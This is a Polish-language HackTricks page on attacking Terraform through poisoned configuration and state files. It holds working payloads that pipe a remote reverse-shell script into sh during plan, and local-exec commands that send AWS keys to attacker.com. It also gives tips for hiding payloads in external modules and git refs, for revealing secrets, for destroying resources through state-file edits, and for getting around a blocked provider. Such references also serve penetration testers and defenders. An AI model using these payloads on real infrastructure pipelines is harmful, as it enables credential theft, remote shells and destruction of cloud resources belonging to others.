# Bezpieczeństwo Terraforma

<details>

{% hint style="success" %}
Dowiedz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Dowiedz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wesprzyj HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Udostępnij sztuczki hakerskie, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na githubie.

</details>
{% endhint %}

## Podstawowe informacje

[Z dokumentacji:](https://developer.hashicorp.com/terraform/intro)

HashiCorp Terraform to narzędzie **infrastruktury jako kod**, które pozwala zdefiniować zarówno **zasoby chmurowe, jak i lokalne** w czytelnych dla ludzi plikach konfiguracyjnych, które można wersjonować, ponownie używać i udostępniać. Następnie możesz użyć spójnego przepływu pracy do wdrażania i zarządzania całym swoim środowiskiem infrastruktury przez cały jego cykl życia. Terraform może zarządzać komponentami niskiego poziomu, takimi jak obliczenia, przechowywanie i zasoby sieciowe, a także komponentami wysokiego poziomu, takimi jak wpisy DNS i funkcje SaaS.

### Jak działa Terraform?

Terraform tworzy i zarządza zasobami na platformach chmurowych i innych usługach za pomocą ich interfejsów programowania aplikacji (API). Dostawcy umożliwiają Terraformowi pracę z praktycznie dowolną platformą lub usługą z dostępnym interfejsem API.

![](<../.gitbook/assets/image (177).png>)

HashiCorp i społeczność Terraformu już napisali **ponad 1700 dostawców** do zarządzania tysiącami różnych typów zasobów i usług, a ta liczba nadal rośnie. Wszystkie publicznie dostępne dostawcy można znaleźć w [Rejestrze Terraforma](https://registry.terraform.io/), w tym Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog i wiele innych.

Podstawowy przepływ pracy Terraforma składa się z trzech etapów:

* **Napisz:** Definiujesz zasoby, które mogą być rozproszone na wielu dostawcach chmurowych i usługach. Na przykład możesz utworzyć konfigurację do wdrożenia aplikacji na maszynach wirtualnych w sieci Virtual Private Cloud (VPC) z grupami zabezpieczeń i równoważnikiem obciążenia.
* **Plan:** Terraform tworzy plan wykonania opisujący infrastrukturę, którą utworzy, zaktualizuje lub zniszczy na podstawie istniejącej infrastruktury i twojej konfiguracji.
* **Zastosuj:** Po zatwierdzeniu Terraform wykonuje proponowane operacje w odpowiedniej kolejności, szanując zależności zasobów. Na przykład, jeśli zaktualizujesz właściwości VPC i zmienisz liczbę maszyn wirtualnych w tym VPC, Terraform najpierw odtworzy VPC, a następnie skaluje maszyny wirtualne.

![](<../.gitbook/assets/image (215).png>)

## Laboratorium Terraforma

Po prostu zainstaluj terraform na swoim komputerze.

Tutaj masz [przewodnik](https://learn.hashicorp.com/tutorials/terraform/install-cli) i tutaj masz [najlepszy sposób na pobranie terraforma](https://www.terraform.io/downloads).

## RCE w Terraform

Terraform **nie ma platformy eksponującej stronę internetową ani usługę sieciową**, którą można by wyliczyć, dlatego jedynym sposobem na skompromitowanie terraforma jest **możliwość dodania/modyfikacji plików konfiguracyjnych terraforma**.

Jednak terraform to **bardzo wrażliwy komponent** do skompromitowania, ponieważ będzie miał **uprzywilejowany dostęp** do różnych lokalizacji, aby móc poprawnie działać.

Głównym sposobem dla atakującego na skompromitowanie systemu, na którym działa terraform, jest **skompromitowanie repozytorium przechowującego konfiguracje terraforma**, ponieważ w pewnym momencie zostaną one **zinterpretowane**.

Faktycznie istnieją rozwiązania, które **automatycznie wykonują terraform plan/apply po utworzeniu PR**, takie jak **Atlantis**:

{% content-ref url="atlantis-security.md" %}
[atlantis-security.md](atlantis-security.md)
{% endcontent-ref %}

Jeśli uda ci się skompromitować plik terraforma, istnieją różne sposoby wykonania RCE, gdy ktoś wykonuje `terraform plan` lub `terraform apply`.

### Terraform plan

Terraform plan to **najczęściej używane polecenie** w terraformie, a programiści/rozwiązania korzystające z terraforma często je wywołują, dlatego **najłatwiejszym sposobem na uzyskanie RCE** jest upewnienie się, że zatrujesz plik konfiguracyjny terraforma, który będzie wykonywał arbitralne polecenia w `terraform plan`.

#### Korzystanie z dostawcy zewnętrznego

Terraform oferuje dostawcę [`external`](https://registry.terraform.io/providers/hashicorp/external/latest/docs), który zapewnia sposób interfejsu między Terraformem a programami zewnętrznymi. Możesz użyć źródła danych `external`, aby uruchomić arbitralny kod podczas `planu`.

Wstrzyknięcie w plik konfiguracyjny terraforma czegoś w rodzaju poniższego spowoduje wykonanie powłoki rev podczas wykonywania `terraform plan`:
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
#### Użycie niestandardowego dostawcy

Atakujący mógłby przesłać [niestandardowego dostawcę](https://learn.hashicorp.com/tutorials/terraform/provider-setup) do [Rejestru Terraforma](https://registry.terraform.io/) a następnie dodać go do kodu Terraforma w gałęzi funkcji ([przykład stąd](https://alex.kaskaso.li/post/terraform-plan-rce)):
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
Dostawca jest pobierany w `init` i uruchomi złośliwy kod podczas wykonywania `plan`

Przykład można znaleźć pod adresem [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec)

#### Korzystanie z zewnętrznego odwołania

Obie wymienione opcje są przydatne, ale niezbyt skryte (druga jest bardziej skryta, ale bardziej skomplikowana niż pierwsza). Możesz przeprowadzić ten atak nawet w **bardziej skryty sposób**, postępując zgodnie z tymi sugestiami:

* Zamiast dodawać rev shell bezpośrednio do pliku terraform, możesz **załadować zewnętrzny zasób**, który zawiera rev shell:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Możesz znaleźć kod rev shell pod adresem [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules)

* W zewnętrznym zasobie użyj funkcji **ref**, aby ukryć **kod rev shell Terraforma w gałęzi** wewnątrz repozytorium, coś w rodzaju: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

### Zastosowanie Terraforma

Zastosowanie Terraforma zostanie wykonane, aby zastosować wszystkie zmiany, można również nadużyć go, aby uzyskać RCE wstrzykując **złośliwy plik Terraforma z** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Wystarczy upewnić się, że pewny ładunek, taki jak poniższe, kończy się w pliku `main.tf`:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Postępuj zgodnie z **sugestiami z poprzedniej techniki**, aby przeprowadzić ten atak w **bardziej skrytym sposób, korzystając z zewnętrznych odwołań**.

## Wycieki Sekretów

Możesz mieć **wartości sekretne używane przez terraform wyciekające** uruchamiając `terraform apply`, dodając coś w rodzaju:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## Nadużywanie plików stanu Terraforma

W przypadku posiadania uprawnień do zapisu plików stanu Terraforma, ale braku możliwości zmiany kodu Terraforma, [**to badanie**](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/) przedstawia kilka interesujących opcji wykorzystania pliku:

### Usuwanie zasobów <a href="#deleting-resources" id="deleting-resources"></a>

Istnieją 2 sposoby niszczenia zasobów:

1. **Wstawienie zasobu o losowej nazwie do pliku stanu wskazującego na rzeczywisty zasób do zniszczenia**

Ponieważ Terraform zauważy, że zasób nie powinien istnieć, zniszczy go (zgodnie z wskazanym rzeczywistym identyfikatorem zasobu). Przykład z poprzedniej strony:
```json
{
"mode": "managed",
"type": "aws_instance",
"name": "example",
"provider": "provider[\"registry.terraform.io/hashicorp/aws\"]",
"instances": [
{
"attributes": {
"id": "i-1234567890abcdefg"
}
}
]
},
```
2. **Zmodyfikuj zasób do usunięcia w taki sposób, że nie będzie możliwe jego zaktualizowanie (zostanie usunięty i odtworzony)**

Dla instancji EC2 wystarczy zmienić typ instancji, aby terraform usunął ją i odtworzył.

### RCE

Możliwe jest również [utworzenie niestandardowego dostawcy](https://developer.hashicorp.com/terraform/tutorials/providers-plugin-framework/providers-plugin-framework-provider) i zastąpienie jednego z dostawców w pliku stanu terraform odpowiednim złośliwym dostawcą lub dodanie pustego zasobu z złośliwym dostawcą. Przykład z oryginalnych badań:
```json
"resources": [
{
"mode": "managed",
"type": "scaffolding_example",
"name": "example",
"provider": "provider[\"registry.terraform.io/dagrz/terrarizer\"]",
"instances": [

]
},
```
## Zastąp zablokowanego dostawcę

W przypadku napotkania sytuacji, w której `hashicorp/external` został umieszczony na czarnej liście, możesz ponownie zaimplementować dostawcę `external`, wykonując następujące kroki. Uwaga: Używamy forka dostawcy external opublikowanego przez https://registry.terraform.io/providers/nazarewk/external/latest. Możesz również opublikować własny fork lub ponowną implementację.
```terraform
terraform {
required_providers {
external = {
source  = "nazarewk/external"
version = "3.0.0"
}
}
}
```
Następnie możesz użyć `external` jak zwykle.
```terraform
data "external" "example" {
program = ["sh", "-c", "whoami"]
}
```
## Narzędzia audytu

* [**tfsec**](https://github.com/aquasecurity/tfsec): tfsec wykorzystuje statyczną analizę kodu terraforma do wykrywania potencjalnych błędów konfiguracyjnych.
* [**terascan**](https://github.com/tenable/terrascan): Terrascan to statyczny analizator kodu dla infrastruktury jako kodu.

## Odnośniki

* [Atlantis Security](atlantis-security.md)
* [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)
* [https://developer.hashicorp.com/terraform/intro](https://developer.hashicorp.com/terraform/intro)
* [https://blog.plerion.com/hacking-terraform-state-privilege-escalation/](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/)

<details>

{% hint style="success" %}
Dowiedz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Dowiedz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wesprzyj HackTricks</summary>

* Sprawdź [**plan abonamentowy**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Udostępniaj sztuczki hakerskie, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
